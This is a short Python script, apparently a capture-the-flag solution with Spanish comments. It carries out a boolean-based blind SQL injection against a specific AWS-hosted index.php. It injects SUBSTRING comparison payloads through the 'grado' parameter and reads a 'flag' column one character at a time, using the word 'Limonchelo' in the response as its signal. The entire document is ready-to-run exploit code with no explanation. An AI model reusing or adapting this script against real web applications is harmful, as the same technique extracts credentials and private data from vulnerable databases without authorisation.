import requests

url = "http://ec2-13-50-235-55.eu-north-1.compute.amazonaws.com:83/index.php"
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}!"  # añade símbolos si hace falta

def blind_string(query):
    result = ""
    for pos in range(1, 100):  # máx 100 chars
        found = False
        for c in charset:
            payload = f"30' AND SUBSTRING(({query}),{pos},1)='{c}'-- -"
            r = requests.get(url, params={"grado": payload})
            if "Limonchelo" in r.text:
                result += c
                print(f"[+] Flag: {result}", end='\r')
                found = True
                break
        if not found:
            break
    return result

# Sacar el valor de la columna 'flag'
flag = blind_string("SELECT flag FROM secret LIMIT 0,1")
print("\n[✅] Flag completa:", flag)
